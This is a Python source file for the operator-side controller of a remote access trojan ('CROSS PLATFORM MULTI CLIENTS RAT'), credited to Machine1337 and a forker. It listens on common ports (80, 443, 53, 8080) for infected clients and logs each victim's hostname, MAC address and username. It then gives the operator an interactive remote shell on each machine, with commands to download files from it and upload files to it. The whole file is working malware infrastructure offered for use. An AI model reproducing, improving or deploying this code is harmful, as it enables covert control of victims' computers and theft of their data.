import socket
import json
import threading
import platform
import os
print("[*] Checking Requirements Module.....")
if platform.system().startswith("Windows"):
    try:
        from pystyle import *
    except ImportError:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *
elif platform.system().startswith("Linux"):
    try:
        from pystyle import *
    except ImportError:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
ports = [8080, 443, 80, 53]
banner = Center.XCenter(r"""
*************************************************************************************************
*     :::    ::: :::::::::: :::        ::::::::::: ::::::::  :::::::::      ::: :::::::::::     *
*     :+:    :+: :+:        :+:            :+:    :+:    :+: :+:    :+:   :+: :+:   :+:         *
*     +:+    +:+ +:+        +:+            +:+    +:+    +:+ +:+    +:+  +:+   +:+  +:+         *
*     +#++:++#++ +#++:++#   +#+            +#+    +#+    +:+ +#++:++#:  +#++:++#++: +#+         *
*     +#+    +#+ +#+        +#+            +#+    +#+    +#+ +#+    +#+ +#+     +#+ +#+         *
*     #+#    #+# #+#        #+#            #+#    #+#    #+# #+#    #+# #+#     #+# #+#         *
*     ###    ### ########## ########## ########### ########  ###    ### ###     ### ###         *
*                                   CROSS PLATFORM MULTI CLIENTS RAT                            *
*                             Coded By: Machine1337, Forked by Neos Helios                      *
*************************************************************************************************
""")
os.system("cls||clear")
print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
ips = []
client_usernames = {}
targets = []
connections = {}
def recv_data(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def send_data(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())
#coded By Machine1337, forked by Neos Helios....If u like the tool...Follow me on github: @machine1337, @ARCH66H
def shell(target, ip):
    while True:
        command = input(Colors.yellow+"\n[*] Shell@%s " % str(ip))
        send_data(target, command)
        if command == 'q':
            break
        if command == 'help':
            print(Colorate.Vertical(Colors.red_to_purple, """
             ****  SHELL COMMANDS MAIN MENU ****
             
    1. download filename  | Download File From Client
    2. upload filename    | upload file To the Client
    3. q                  | Back To The Server Main Menu 
    4. kill               | Terminate the client shell
                   More Features Will Be Added
                   Follow:- github.com/machine1337
                                """, 2))
        elif command[:8] == "download":
            download_file(target, command[9:])
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command == 'kill':
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        else:
            message = recv_data(target)
            print(message)

def server(s):
    global clients, connections
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target, ip = s.accept()
            if ip[0] in connections:
                target.close()
            else:
                info = recv_data(target)
                if "Handshake Successful:" in info:
                    # Logic to handle your new client's string format
                    # "Handshake Successful: [hostname] as [user]"
                    parts = info.replace("Handshake Successful: ", "").split(" as ")
                    hostname = parts[0]
                    username = parts[1]
                    mac_address = "N/A" # Your client isn't sending MAC yet
                else:
                    # Fallback for the original Machine1337 format
                    try:
                        hostname, mac_address, username = info.split(',')
                    except ValueError:
                        hostname, mac_address, username = "Unknown", "N/A", "Unknown"
                client_data = {'HostName': hostname, 'MAC_Address': mac_address, 'Username': username}
                client_usernames[ip[0]] = client_data
                targets.append(target)
                ips.append(ip)
                connections[ip[0]] = target
                print(Colors.green+"{} ({}:{}) has connected!".format(username, ip[0], ip[1])+"\n[*] Server Command (Type help):- ",end="")
                clients += 1
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            break
    print(Colors.red+"\n[*] Server shutting down...")
    for target in targets:
        target.close()
    s.close()
def listclients():
    print("\n--------------------------------------------------------------------------------------")
    print("SESSIONS  |  HOSTNAME         |  MAC ADDRESS           | USERNAME         | IP ADDRESS")
    for count, ip in enumerate(ips):
        if ip[0] in client_usernames:
            target_info = client_usernames[ip[0]]
            print("{:<10}|{:<12}       {:<15}           {:<11}       {}:{}".format(count, target_info['HostName'],
                                                                                   target_info['MAC_Address'],
                                                                                   target_info['Username'], ip[0],
                                                                                   str(ip[1])))
        else:
            print(
                "{:<10}|{:<12}         {:<15}           {:<11}       {}:{}".format(count, 'Unknown', 'None', 'Unknown',
                                                                                   ip[0], str(ip[1])))
        count += 1
    print("---------------------------------------------------------------------------------------")
def selectclient():
    try:
        num = int(command[8:])
        tarnum = targets[num]
        tarip = ips[num]
        shell(tarnum, tarip)
    except:
        print(Colors.red+"\n[*] No session id under that number")
if __name__ == '__main__':
    stop_threads = False
    clients = 0
    for port in ports:
        # Create a unique socket for every port
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind(("0.0.0.0", port))
            sock.listen(5)
            # Start a thread for this specific port
            threading.Thread(target=server, args=(sock,), daemon=True).start()
        except:
            print(f"Port {port} failed (maybe use sudo/admin?)")
    try:
        while True:
            command = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Server Command (Type help):- ", 2))
            if command == "targets":
                listclients()
            elif command == "help":
                print(Colorate.Vertical(Colors.red_to_purple, """
                ****  SERVER COMMANDS MAIN MENU ****
    1. targets   ---> Display Connected Clients
    2. session   ---> go to specific client shell like session 0
    3. exit      ---> Terminate the server  
            """, 2))
            elif command[:7] == "session":
                selectclient()
            elif command == "exit":
                stop_threads = True
                break
    except KeyboardInterrupt:
        stop_threads = True
#coded By Machine1337, forked by Neos Helios....If u like the tool...Follow me on github: @machine1337, @ARCH66H
